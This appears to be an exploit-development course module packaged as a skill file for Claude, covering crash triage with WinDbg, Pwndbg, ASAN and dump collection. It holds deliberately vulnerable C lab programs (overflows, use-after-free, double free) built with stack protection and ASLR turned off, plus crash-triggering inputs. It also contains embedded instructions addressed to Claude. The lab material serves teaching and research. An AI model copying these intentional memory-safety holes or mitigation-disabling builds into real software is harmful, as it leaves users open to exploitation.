<!-- source: Claude-Red Skills/exploit-dev/offensive-crash-analysis -->
<!-- fused into host package: pwn-chain -->

# SKILL: Week 4: Crash Analysis and Exploitability Assessment

## Metadata
- **Skill Name**: crash-analysis
- **Folder**: offensive-crash-analysis
- **Source**: https://github.com/SnailSploit/offensive-checklist/blob/main/4-crash-analysis.md

## Description
Week 4 exploit development curriculum. Crash triage and analysis methodology: WinDbg/GDB analysis, ASAN/MSAN output interpretation, exploitability assessment, register/stack trace reading, root cause identification. Use when analyzing crash dumps, assessing exploitability, or understanding fuzzer-generated crashes.

## Trigger Phrases
Use this skill when the conversation involves any of:
`crash analysis, crash triage, WinDbg, GDB, ASAN, MSAN, exploitability, stack trace, register dump, segfault, null deref, access violation, week 4`

## Instructions for Claude

When this skill is active:
1. Load and apply the full methodology below as your operational checklist
2. Follow steps in order unless the user specifies otherwise
3. For each technique, consider applicability to the current target/context
4. Track which checklist items have been completed
5. Suggest next steps based on findings

---

## Full Methodology

# Week 4: Crash Analysis and Exploitability Assessment

## Overview

_created by AnotherOne from @Pwn3rzs Telegram channel_.

After finding potential vulnerabilities through fuzzing (Week 2) or patch diffing (Week 3), the next critical step is analyzing crashes to determine if they're exploitable. This week focuses on crash triage, debugger mastery, and techniques for identifying how to reach vulnerable code paths from attacker-controlled input.

Once you've confirmed a crash is exploitable and built a PoC, you'll be ready for Basic Exploitation in Week 5.

### Prerequisites

Before starting this week, ensure you have:

- A Windows VM (for WinDbg labs) and a Linux VM (for GDB/ASAN/CASR labs).
- Completed Week 2 fuzzing labs, including running AFL++ or libFuzzer against at least one C/C++ target
- Completed (or skimmed) Week 3 patch diffing labs:
  - Familiar with Ghidriff/Diaphora diff reports and how to interpret changed functions
  - Understand how to extract Windows updates and Linux kernel patches
  - Reviewed at least one case study (CVE-2022-34718 EvilESP, CVE-2024-1086 nf_tables, or 7-Zip symlink bugs)
- Comfortable understanding from Week 1 of basic vulnerability classes (buffer overflow, UAF, integer bugs, info leaks) and their exploit primitives

### Crash Analysis Decision Tree

Use this decision tree to select the appropriate tools and workflow for any crash you encounter:

```
┌─────────────────────────────────────────────────────────────────────┐
│                        CRASH RECEIVED                               │
└─────────────────────────────────────────────────────────────────────┘
                                │
                                ▼
                    ┌───────────────────────┐
                    │ Source code available?│
                    └───────────────────────┘
                      │                    │
                     Yes                   No
                      │                    │
                      ▼                    ▼
        ┌─────────────────────┐   ┌──────────────────────────┐
        │ Recompile with      │   │ What platform?           │
        │ ASAN + UBSAN        │   └──────────────────────────┘
        │ (Day 2)             │     │         │         │
        └─────────────────────┘     │         │         │
                      │          Windows   Linux    Mobile
                      │             │         │         │
                      ▼             ▼         ▼         ▼
        ┌─────────────────────┐ ┌───────┐ ┌───────┐ ┌───────────┐
        │ Run crash input     │ │WinDbg │ │Pwndbg │ │ Tombstone │
        │ Get detailed report │ │+ TTD  │ │+ rr   │ │ + Frida   │
        └─────────────────────┘ │(Day 1)│ │(Day 1)│ │ (Future)  │
                      │         └───────┘ └───────┘ └───────────┘
                      │             │         │         │
                      └─────────────┴────┬────┴─────────┘
                                         │
                                         ▼
                    ┌─────────────────────────────────────┐
                    │ Crash requires special environment? │
                    └─────────────────────────────────────┘
                       │                              │
                      Yes                             No
                       │                              │
                       ▼                              │
        ┌─────────────────────────────┐               │
        │ Setup reproduction env:     │               │
        │ - Network (tcpdump, proxy)  │               │
        │ - Files (strace, procmon)   │               │
        │ - Services (docker, VM)     │               │
        └─────────────────────────────┘               │
                       │                              │
                       └──────────────┬───────────────┘
                                      │
                                      ▼
                            ┌─────────────────────┐
                            │ Crash type known?   │
                            └─────────────────────┘
                              │                 │
                             Yes                No
                              │                 │
                              ▼                 ▼
                ┌─────────────────────┐  ┌─────────────────────┐
                │ Run CASR for        │  │ Manual analysis:    │
                │ classification      │  │ - Examine registers │
                │ (Day 3)             │  │ - Check memory      │
                └─────────────────────┘  │ - Disassemble       │
                              │          │ (Day 3)             │
                              │          └─────────────────────┘
                              │                 │
                              └────────┬────────┘
                                       │
                                       ▼
                          ┌─────────────────────────┐
                          │ EXPLOITABILITY ASSESS   │
                          │ - Check mitigations     │
                          │ - Control analysis      │
                          │ - Reachability (Day 4)  │
                          └─────────────────────────┘
                                       │
                                       ▼
                          ┌─────────────────────────┐
                          │ Multiple crashes?       │
                          └─────────────────────────┘
                            │                    │
                           Yes                   No
                            │                    │
                            ▼                    ▼
              ┌─────────────────────┐   ┌─────────────────────┐
              │ Deduplicate (Day 5) │   │ Minimize (Day 5)    │
              │ - CASR cluster      │   │ - afl-tmin          │
              │ - Stack hash        │   │ - Manual reduction  │
              └─────────────────────┘   └─────────────────────┘
                            │                    │
                            └────────┬───────────┘
                                     │
                                     ▼
                        ┌─────────────────────────┐
                        │ Create PoC (Day 6)      │
                        │ - Python + pwntools     │
                        │ - Verify reliability    │
                        │ - Document findings     │
                        └─────────────────────────┘
```

**Quick Reference - Tool Selection by Scenario**:

| Scenario                    | Primary Tool               | Secondary Tool   | Sanitizer    |
| --------------------------- | -------------------------- | ---------------- | ------------ |
| Linux binary, have source   | GDB + Pwndbg               | rr               | ASAN + UBSAN |
| Linux binary, no source     | GDB + Pwndbg               | Ghidra           | N/A          |
| Windows binary, have source | WinDbg + TTD               | Visual Studio    | ASAN         |
| Windows binary, no source   | WinDbg + TTD               | IDA/Ghidra       | N/A          |
| Fuzzer crash corpus         | CASR                       | afl-tmin         | ASAN         |
| Non-deterministic crash     | rr (Linux) / TTD (Windows) | Chaos mode       | TSAN         |
| Kernel crash (Linux)        | crash utility              | GDB + KASAN      | KASAN        |
| Kernel crash (Windows)      | WinDbg kernel              | Driver Verifier  | N/A          |
| Android app crash           | Tombstone + ndk-stack      | Frida            | HWASan       |
| Rust/Go crash               | Native debugger            | Sanitizer output | Built-in     |

## Day 1: Debugger Fundamentals and Crash Dump Analysis

- **Goal**: Learn Windows Debugger (WinDbg) and Linux debugger (GDB + Pwndbg) for analyzing application crashes.
- **Activities**:
  - _Reading_:
    - "Practical Malware Analysis" by Michael Sikorski - Chapter 9 and 10
    - [WinDbg Official Documentation](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/)
    - [Pwndbg Documentation](https://pwndbg.re/stable/)
  - _Online Resources_:
    - [Common WinDbg Commands](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/commands)
    - [Debugging Tools for Windows](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools)
    - [GDB Quick Reference](https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf)
  - _Tool Setup_:
    - **Windows**: Install WinDbg Preview from Microsoft Store
    - **Linux**: Install GDB with Pwndbg enhancement
    - Install Windows SDK for symbol support
  - _Exercise_:
    - Analyze 5 pre-generated crash dumps (Windows and Linux)
    - Identify crash type and root cause for each

### Reproduction Fidelity

> [!IMPORTANT]
> Before any crash analysis, ensure you can reproduce the crash reliably.
> A crash that only happens "sometimes" or "on the fuzzer's machine" is nearly impossible to analyze or exploit.
> This section establishes the mandatory checklist for achieving reproduction fidelity.

#### Reproduction Fidelity Checklist

Before analyzing any crash, verify these match between discovery and analysis environments:

```text
┌─────────────────────────────────────────────────────────────────┐
│ REPRODUCTION FIDELITY CHECKLIST                                 │
├─────────────────────────────────────────────────────────────────┤
│ System Environment                                              │
│ [ ] OS/Kernel version     : ________________________________    │
│ [ ] libc version          : ________________________________    │
│ [ ] CPU architecture      : [ ] x86 [ ] x86_64 [ ] ARM64        │
│ [ ] Container/VM          : [ ] Native [ ] Docker [ ] VM        │
│ [ ] ASLR state            : [ ] Enabled [ ] Disabled            │
├─────────────────────────────────────────────────────────────────┤
│ Process Environment                                             │
│ [ ] argv (command-line)   : ________________________________    │
│ [ ] Environment variables : ________________________________    │
│ [ ] Working directory     : ________________________________    │
│ [ ] Locale (LC_ALL, LANG) : ________________________________    │
│ [ ] umask / permissions   : ________________________________    │
├─────────────────────────────────────────────────────────────────┤
│ Input Path                                                      │
│ [ ] Input source          : [ ] stdin [ ] file [ ] network      │
│ [ ] Input file path       : ________________________________    │
│ [ ] Network port/protocol : ________________________________    │
├─────────────────────────────────────────────────────────────────┤
│ Build Configuration                                             │
│ [ ] Compiler version      : ________________________________    │
│ [ ] Optimization level    : [ ] -O0 [ ] -O1 [ ] -O2 [ ] -O3     │
│ [ ] Sanitizers            : [ ] ASAN [ ] UBSAN [ ] TSAN [ ] None│
│ [ ] Debug symbols         : [ ] Yes [ ] No                      │
│ [ ] Mitigations           : [ ] PIE [ ] Canary [ ] RELRO        │
└─────────────────────────────────────────────────────────────────┘
```

#### Essential Environment Knobs

**ASAN/UBSAN Options** (Linux/macOS):

```bash
# Full ASAN options for crash analysis
export ASAN_OPTIONS="\
abort_on_error=1:\
symbolize=1:\
detect_leaks=1:\
disable_coredump=0:\
halt_on_error=1:\
print_stats=1:\
check_initialization_order=1:\
detect_stack_use_after_return=1:\
quarantine_size_mb=256"

# UBSAN options
export UBSAN_OPTIONS="\
print_stacktrace=1:\
halt_on_error=1:\
suppressions=ubsan_suppressions.txt"

# Symbolizer path (required for readable stack traces)
export ASAN_SYMBOLIZER_PATH=$(command -v llvm-symbolizer)
```

**glibc Allocator Tuning** (Linux):

```bash
# Enable glibc heap consistency checks (catch corruption early)
export MALLOC_CHECK_=3

# Modern glibc tunable interface (glibc 2.26+)
export GLIBC_TUNABLES="\
glibc.malloc.check=3:\
glibc.malloc.perturb=165"

# What these do:
# MALLOC_CHECK_=3: Abort on heap corruption detection
# glibc.malloc.perturb=165: Fill freed memory with 0xA5 (helps detect UAF)
```

**Core Dump Configuration** (Linux):

```bash
# Enable unlimited core dumps
ulimit -c unlimited

# Verify core pattern (where dumps go)
cat /proc/sys/kernel/core_pattern

# For local dumps in CWD (temporary, affects system):
# echo 'core.%e.%p' | sudo tee /proc/sys/kernel/core_pattern
```

**ASLR Control** (Linux - for deterministic analysis):

```bash
# Check current ASLR state
cat /proc/sys/kernel/randomize_va_space
# 0 = disabled, 1 = conservative, 2 = full

# Disable ASLR for current shell (temporary, per-process)
setarch $(uname -m) -R ./target < crash_input

# Or system-wide (DANGEROUS - only for isolated VMs):
# echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

#### Input Path Matching

The crash may behave differently depending on HOW input reaches the target:

```bash
# If fuzzer used stdin:
./target < crash_input

# If fuzzer used file argument:
./target crash_input

# If fuzzer used network:
cat crash_input | nc localhost 8080

# WRONG: Mixing input paths can change behavior!
# Fuzzer: ./target @@ (file)
# You:    ./target < crash (stdin)  # May not reproduce!
```

**Example: stdin vs file difference**:

```c
// Some programs behave differently:
// - stdin may be line-buffered
// - File may be memory-mapped
// - Network may have different read chunk sizes

// This can affect:
// - Buffer contents at crash time
// - Heap layout (different allocation patterns)
// - Race conditions (timing changes)
```

#### Quick Reproduction Test Script

```bash
#!/bin/bash
# repro_test.sh - Verify crash reproduction

CRASH_INPUT="$1"
TARGET="$2"
EXPECTED_SIGNAL="${3:-11}"  # Default: SIGSEGV (11)

echo "[*] Testing reproduction of $(basename $CRASH_INPUT)"
echo "[*] Target: $TARGET"
echo "[*] Expected signal: $EXPECTED_SIGNAL"

# Set up environment
ulimit -c unlimited
export ASAN_OPTIONS="abort_on_error=1:symbolize=1"

# Run 10 times
CRASHES=0
for i in {1..10}; do
    timeout 5s $TARGET < "$CRASH_INPUT" 2>/dev/null
    EXIT_CODE=$?

    # Check for crash signal (128 + signal number)
    if [ $EXIT_CODE -gt 128 ]; then
        SIGNAL=$((EXIT_CODE - 128))
        if [ $SIGNAL -eq $EXPECTED_SIGNAL ] || [ $SIGNAL -eq 6 ]; then
            ((CRASHES++))
        fi
    fi
done

echo "[*] Crash rate: $CRASHES/10"
if [ $CRASHES -ge 9 ]; then
    echo "[+] Reproduction: RELIABLE"
elif [ $CRASHES -ge 5 ]; then
    echo "[!] Reproduction: FLAKY - investigate environment"
else
    echo "[-] Reproduction: FAILED - check environment checklist"
fi
```

### Installing WinDbg and Symbol Support

**WinDbg Preview** (recommended - modern UI):

```batch
winget install Microsoft.WinDbg
```

**Windows SDK Debugging Tools** (includes cdb.exe for command-line/batch analysis):

```bash
# Option 1: Install via winget (Windows SDK)
winget install --source winget --exact --id Microsoft.WindowsSDK.10.0.26100

# Option 2: Download from Microsoft
# https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/
# During installation, select "Debugging Tools for Windows"

# After installation, cdb.exe is located at:
# C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\cdb.exe

# Add to PATH for convenience (run as Administrator):
setx PATH "%PATH%;C:\Program Files (x86)\Windows Kits\10\Debuggers\x64" /M

# Or use full path in scripts:
"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\cdb.exe" -z dump.dmp -c "!analyze -v; q"
```

**Configure Symbol Path**:

```bash
# In WinDbg Settings -> Default Symbol Path, or:
# In WinDbg command window:
.sympath SRV*C:\Symbols*https://msdl.microsoft.com/download/symbols

# Or set environment variable permanently (recommended):
setx _NT_SYMBOL_PATH "SRV*C:\Symbols*https://msdl.microsoft.com/download/symbols"

# Create symbols cache directory
mkdir C:\Symbols

# Reload symbols (in debugger)
.reload /f
```

### Linux Crash Dump Generation and Pwndbg Setup

> [!HINT]
> While Windows uses WinDbg, Linux crash analysis uses GDB enhanced with Pwndbg. This section covers parallel Linux setup.

**Installing Pwndbg**:

```bash
# Install GDB
sudo apt install gdb

# Install Pwndbg (recommended for crash analysis)
cd ~/tools
git clone --depth 1 https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh

# Verify installation
gdb -q -ex "quit" 2>&1 | grep -q "pwndbg" && echo "pwndbg installed successfully"
```

> [!WARNING]
> Pwndbg is installed per-user in `~/.gdbinit`. If you run `sudo gdb`, it uses root's home directory and won't find your pwndbg config. Solutions:
> For crash analysis of your own compiled test programs, you typically don't need sudo. Only use sudo when attaching to system processes or analyzing setuid binaries.

```bash
# Option 1: Use gdb as regular user (recommended for most analysis)
cd ~/crash_analysis_lab
gdb ./vuln_no_protect -c core.dump

# Option 2: If you MUST use sudo (e.g., attaching to privileged process)
sudo -E gdb ./program  # -E preserves your environment including HOME

# Option 3: Install pwndbg for root as well
sudo su -
cd /root
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh
exit

# Option 4: Explicitly source pwndbg in sudo gdb session
sudo gdb -ex "source /home/<YOUR_USER>/tools/pwndbg/gdbinit.py" ./program
```

**Configuring Core Dumps on Linux**:

```bash
# Check current core dump configuration
cat /proc/sys/kernel/core_pattern

# Enable core dumps for current shell (recommended for learning)
ulimit -c unlimited
```

> [!TIP]
> **For the exercises in this course**, you typically only need:
>
> ```bash
> ulimit -c unlimited  # In your current shell
> ```
>
> On modern Ubuntu/Debian with systemd, cores are handled by `systemd-coredump` even if you set `ulimit`.
> Use `coredumpctl` to list and debug them.

> [!WARNING]
> **Optional: Local core files in CWD** (modifies system-wide settings)
>
> If you specifically need core files in your working directory instead of systemd-coredump:
>
> ```bash
> # This is SYSTEM-WIDE and may interfere with other tooling
> echo 'core.%e.%p' | sudo tee /proc/sys/kernel/core_pattern
> ```
>
> Additional kernel settings that affect core dumps:
>
> - `kernel.core_uses_pid`: Append PID to core filename
> - `fs.suid_dumpable`: Controls dumps for setuid binaries (0=disabled, 1=enabled, 2=suidsafe)

### Building a Vulnerable Test Suite for Linux

Create these vulnerable C programs to generate real crashes:

```bash
# Create a directory for crash analysis practice
mkdir -p ~/crash_analysis_lab/{src,crashes,cores}
cd ~/crash_analysis_lab/src
```

**vulnerable_suite.c** - Save this file for testing multiple vulnerability types:

```c
// ~/crash_analysis_lab/src/vulnerable_suite.c - Compile with different flags for different exercises
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// 1. Stack Buffer Overflow
void stack_overflow(char *input) {
    char buffer[64];
    printf("[*] Copying input to 64-byte buffer...\n");
    strcpy(buffer, input);  // No bounds check!
    printf("[*] Buffer: %s\n", buffer);
}

// 2. Heap Buffer Overflow
void heap_overflow(char *input) {
    char *buf = malloc(32);
    printf("[*] Allocated 32 bytes at %p\n", buf);
    strcpy(buf, input);  // Overflow heap buffer
    printf("[*] Buffer: %s\n", buf);
    free(buf);
}

// 3. Use-After-Free
void use_after_free() {
    char *ptr = malloc(64);
    strcpy(ptr, "Hello, World!");
    printf("[*] Allocated at %p: %s\n", ptr, ptr);
    free(ptr);
    printf("[*] Freed, now accessing...\n");
    printf("[*] UAF read: %s\n", ptr);  // UAF read - may print stale data
    ptr[0] = 'X';  // UAF write - may corrupt allocator state
}

// 4. Double Free
void double_free() {
    char *ptr = malloc(64);
    printf("[*] Allocated at %p\n", ptr);
    free(ptr);
    printf("[*] First free done\n");
    free(ptr);  // Double free!
}

// 5. NULL Pointer Dereference
void null_deref(int trigger) {
    char *ptr = trigger ? malloc(10) : NULL;
    printf("[*] ptr = %p\n", ptr);
    *ptr = 'A';  // NULL deref if trigger is 0
}

void print_usage(char *prog) {
    printf("Usage: %s <test_num> [input]\n", prog);
    printf("Tests:\n");
    printf("  1 <input>  - Stack overflow (need ~100+ chars)\n");
    printf("  2 <input>  - Heap overflow (need ~50+ chars)\n");
    printf("  3          - Use-after-free\n");
    printf("  4          - Double free\n");
    printf("  5 <0|1>    - NULL deref (0=crash)\n");
    printf("\nExample: %s 1 $(python3 -c \"print('A'*100)\")\n", prog);
}

int main(int argc, char **argv) {
    if (argc < 2) { print_usage(argv[0]); return 1; }
    int test = atoi(argv[1]);

    switch(test) {
        case 1: if (argc<3) return 1; stack_overflow(argv[2]); break;
        case 2: if (argc<3) return 1; heap_overflow(argv[2]); break;
        case 3: use_after_free(); break;
        case 4: double_free(); break;
        case 5: if (argc<3) return 1; null_deref(atoi(argv[2])); break;
        default: print_usage(argv[0]); return 1;
    }
    return 0;
}
```

**Build the test suite**:

```bash
cd ~/crash_analysis_lab/src

# 1. Build WITHOUT mitigations (for basic crash analysis)
gcc -g -fno-stack-protector -no-pie -z execstack \
    vulnerable_suite.c -o ../vuln_no_protect

# 2. Build WITH ASAN (for detailed memory error reports)
gcc -g -O1 -fsanitize=address -fno-omit-frame-pointer \
    vulnerable_suite.c -o ../vuln_asan

# 3. Build with standard protections (see how mitigations affect crashes)
gcc -g vulnerable_suite.c -o ../vuln_protected
```

**Generate your first crashes**:

```bash
cd ~/crash_analysis_lab

# Enable core dumps
ulimit -c unlimited

# Test 1: Stack overflow - generates a core dump
./vuln_no_protect 1 $(python3 -c "print('A'*200)")
# You should see: Segmentation fault (core dumped)
# Check for core file: ls -la core* (if core_pattern writes to CWD) or use coredumpctl (systemd systems) or look at output of `cat /proc/sys/kernel/core_pattern`

# Test 2: Stack overflow with ASAN - detailed report
./vuln_asan 1 $(python3 -c "print('A'*200)") 2>&1 | tee crashes/stack_asan.txt
# ASAN prints detailed overflow information

# Test 3: Use-after-free with ASAN
./vuln_asan 3 2>&1 | tee crashes/uaf_asan.txt

# Test 4: NULL dereference - generates core dump
./vuln_no_protect 5 0
```

**Using coredumpctl (systemd systems)**:

```bash
sudo apt install systemd-coredump
# List recent core dumps
coredumpctl list

# Show details of most recent crash
coredumpctl info

# Debug most recent crash with GDB
coredumpctl debug

# Debug specific crash by PID
coredumpctl debug 12345

# Extract core dump to file for offline analysis
coredumpctl dump -o crash.core

# View where cores are stored
cat /etc/systemd/coredump.conf
# [Coredump]
# Storage=external    # 'external' = /var/lib/systemd/coredump/
# Compress=yes
# MaxUse=1G          # Max disk space for cores
```

**Configuring systemd-coredump** (`/etc/systemd/coredump.conf`):

```ini
[Coredump]
# Where to store cores: external (disk), journal, or none
Storage=external

# Compress with zstd/lz4
Compress=yes

# Maximum size for stored cores
ProcessSizeMax=2G

# Maximum total disk usage
MaxUse=5G

# Keep cores for this long
KeepFree=1G
```

After editing, reload: `sudo systemctl daemon-reload`

### ASAN and Core Dumps

> [!NOTE]
> **ASAN often exits via SIGABRT, not SIGSEGV**. This can be confusing when trying to capture core dumps.

```bash
# ASAN default: aborts on error (SIGABRT = signal 6)
# Core dumps may not be generated by default for SIGABRT

# Method 1: Configure ASAN to allow core dumps
export ASAN_OPTIONS="abort_on_error=1:disable_coredump=0"

# Method 2: Check that coredumpctl captures SIGABRT
# coredumpctl list
# Should show crashes with signal=6 (SIGABRT)

# Method 3: Use gdb to catch ASAN abort
echo "1 $(python3 -c "print('A'*200)")" > crash_input
gdb ./vuln_asan
(gdb) run < crash_input
# ASAN prints report, then GDB catches SIGABRT
(gdb) bt full  # Get full backtrace

# What "success" looks like with ASAN + core dump:
# 1. ASAN prints detailed error report (allocation/free stacks)
# 2. Program aborts with SIGABRT
# 3. coredumpctl captures the core
# 4. coredumpctl debug lets you examine state at abort
```

### Building Vulnerable Test Suite for Windows

**Prerequisites**:

- Visual Studio 2022 (Community edition is free) or Build Tools for Visual Studio
- Open "x64 Native Tools Command Prompt for VS 2022" for compilation

**vulnerable_suite_win.c** - Save this file for Windows crash analysis practice:

```c
// C:\CrashAnalysisLab\src\vulnerable_suite_win.c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void stack_overflow(char *input) {
    char buffer[64];
    printf("[*] Copying input to 64-byte buffer...\n");
    strcpy(buffer, input);
    printf("[*] Buffer: %s\n", buffer);
}

void heap_overflow(char *input) {
    char *buf = (char*)HeapAlloc(GetProcessHeap(), 0, 32);
    printf("[*] Allocated 32 bytes at %p\n", buf);
    strcpy(buf, input);
    printf("[*] Buffer: %s\n", buf);
    HeapFree(GetProcessHeap(), 0, buf);
}

void use_after_free() {
    char *ptr = (char*)HeapAlloc(GetProcessHeap(), 0, 64);
    strcpy(ptr, "Hello, World!");
    printf("[*] Allocated at %p: %s\n", ptr, ptr);
    HeapFree(GetProcessHeap(), 0, ptr);
    printf("[*] Freed, now accessing...\n");
    printf("[*] UAF read: %s\n", ptr);
    ptr[0] = 'X';
}

void double_free() {
    char *ptr = (char*)HeapAlloc(GetProcessHeap(), 0, 64);
    printf("[*] Allocated at %p\n", ptr);
    HeapFree(GetProcessHeap(), 0, ptr);
    printf("[*] First free done\n");
    HeapFree(GetProcessHeap(), 0, ptr);
}

void null_deref(int trigger) {
    char *ptr = trigger ? (char*)HeapAlloc(GetProcessHeap(), 0, 10) : NULL;
    printf("[*] ptr = %p\n", ptr);
    *ptr = 'A';
}

void integer_overflow(unsigned int size) {
    unsigned int alloc_size = size + 16;
    if (alloc_size < size) {
        printf("[*] Integer overflow detected! alloc_size=%u\n", alloc_size);
    }
    char *buf = (char*)HeapAlloc(GetProcessHeap(), 0, alloc_size);
    printf("[*] Allocated %u bytes at %p\n", alloc_size, buf);
    memset(buf, 'A', size);
    HeapFree(GetProcessHeap(), 0, buf);
}

void print_usage(char *prog) {
    printf("Windows Vulnerable Test Suite\n");
    printf("==============================\n");
    printf("Usage: %s <test_num> [input]\n\n", prog);
    printf("Tests:\n");
    printf("  1 <input>  - Stack overflow (need ~100+ chars)\n");
    printf("  2 <input>  - Heap overflow (need ~50+ chars)\n");
    printf("  3          - Use-after-free\n");
    printf("  4          - Double free\n");
    printf("  5 <0|1>    - NULL deref (0=crash)\n");
    printf("  6 <size>   - Integer overflow (try 4294967280)\n");
    printf("\nExamples:\n");
    printf("  %s 1 ", prog);
    printf("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n");
    printf("  %s 5 0\n", prog);
}

int main(int argc, char **argv) {
    if (argc < 2) { print_usage(argv[0]); return 1; }
    int test = atoi(argv[1]);

    switch(test) {
        case 1: if (argc<3) return 1; stack_overflow(argv[2]); break;
        case 2: if (argc<3) return 1; heap_overflow(argv[2]); break;
        case 3: use_after_free(); break;
        case 4: double_free(); break;
        case 5: if (argc<3) return 1; null_deref(atoi(argv[2])); break;
        case 6: if (argc<3) return 1; integer_overflow((unsigned int)strtoul(argv[2], NULL, 10)); break;
        default: print_usage(argv[0]); return 1;
    }
    printf("[*] Test completed without crash\n");
    return 0;
}
```

**Build the Windows test suite**:

```bash
# install visual studio community
# Open "x64 Native Tools Command Prompt for VS 2022"

# Create lab directory
mkdir C:\CrashAnalysisLab\src
mkdir C:\CrashAnalysisLab\dumps
cd C:\CrashAnalysisLab\src

# Save the source code above as vulnerable_suite_win.c, then:

# 1. Build WITHOUT mitigations (for basic crash analysis)
#    /GS- disables stack cookies, /DYNAMICBASE:NO disables ASLR
cl /Zi /Od /GS- vulnerable_suite_win.c /Fe:..\vuln_win.exe /link /DYNAMICBASE:NO /NXCOMPAT:NO

# 2. Build WITH ASAN (Visual Studio 2019 16.9+ or VS 2022)
cl /Zi /Od /fsanitize=address vulnerable_suite_win.c /Fe:..\vuln_asan.exe

# 3. Build with standard protections (default mitigations)
cl /Zi /Od vulnerable_suite_win.c /Fe:..\vuln_protected.exe
```

**Generate your first Windows crashes**:

```bash
cd C:\CrashAnalysisLab

# Test 1: Stack overflow
vuln_win.exe 1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Should crash with access violation
# crash will be at C:\CrashDumps\

# Test 2: Stack overflow with ASAN - detailed report
vuln_asan.exe 1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# ASAN prints detailed overflow information

# Test 3: Use-after-free with ASAN
vuln_asan.exe 3

# Test 4: NULL dereference
vuln_win.exe 5 0

# Test 5: Double free (may not crash immediately without PageHeap)
vuln_win.exe 4

# Directory of C:\CrashDumps

# 01/05/2026  03:11 PM    <DIR>          .
# 01/05/2026  03:10 PM         9,879,181 vuln_win.exe.7452.dmp
# 01/05/2026  03:11 PM         9,866,817 vuln_win.exe.7756.dmp
# 01/05/2026  03:09 PM        10,543,599 vuln_win.exe.984.dmp
```

**Using PowerShell to generate long strings**:

```bash
# PowerShell equivalent of Python one-liners
cd C:\CrashAnalysisLab

# Generate 200 'A' characters
$payload = "A" * 200

# Test stack overflow
.\vuln_win.exe 1 $payload

# Test with ASAN
.\vuln_asan.exe 1 $payload 2>&1 | Tee-Object -FilePath C:\CrashDumps\stack_asan.txt

# Test UAF with ASAN
.\vuln_asan.exe 3 2>&1 | Tee-Object -FilePath C:\CrashDumps\uaf_asan.txt
```

**Verify crashes are captured**:

```bash
# If WER LocalDumps is configured (see next section), check:
dir C:\CrashDumps\

# Or use Event Viewer:
# Windows Logs -> Application -> Look for "Application Error" events
```

### WER/ProcDump Dump Collection

#### Windows Error Reporting (WER) LocalDumps

WER is Windows' built-in crash reporting. Configure it to save dumps locally:

**Enable LocalDumps via Registry**:

```bash
# Create LocalDumps key for ALL applications
reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps" /v DumpFolder /t REG_EXPAND_SZ /d "C:\CrashDumps" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps" /v DumpType /t REG_DWORD /d 2 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps" /v DumpCount /t REG_DWORD /d 10 /f

# DumpType values:
# 0 = Custom (use CustomDumpFlags)
# 1 = Mini dump
# 2 = Full dump (recommended for crash analysis)

# Create dump directory
mkdir C:\CrashDumps
```

**Per-Application LocalDumps** (configure for our test binary):

```bash
# Configure for our vulnerable test binary
reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps\vuln_win.exe" /v DumpFolder /t REG_EXPAND_SZ /d "C:\CrashAnalysisLab\dumps" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps\vuln_win.exe" /v DumpType /t REG_DWORD /d 2 /f

# Or for any application
reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps\target.exe" /v DumpFolder /t REG_EXPAND_SZ /d "C:\CrashDumps\target" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps\target.exe" /v DumpType /t REG_DWORD /d 2 /f
```

**Verify WER is Enabled**:

```bash
# Check WER service status
Get-Service WerSvc

# Check LocalDumps configuration
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps"
```

#### Sysinternals ProcDump

ProcDump provides more control than WER and catches crashes in real-time:

**Basic Crash Capture** (using our test binary):

```bash
winget install Microsoft.Sysinternals.Suite

# First, ensure you've built the test suite (see "Building a Windows Vulnerable Test Suite" above)
cd C:\CrashAnalysisLab

# Options:
# -ma    : Full memory dump (recommended)
# -e     : Write dump on unhandled exception
# -x     : Launch and monitor (below)

# Launch and monitor for crashes
procdump -ma -e -x dumps vuln_win.exe 1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

# Monitor already-running process
procdump -ma -e -p <PID>
```

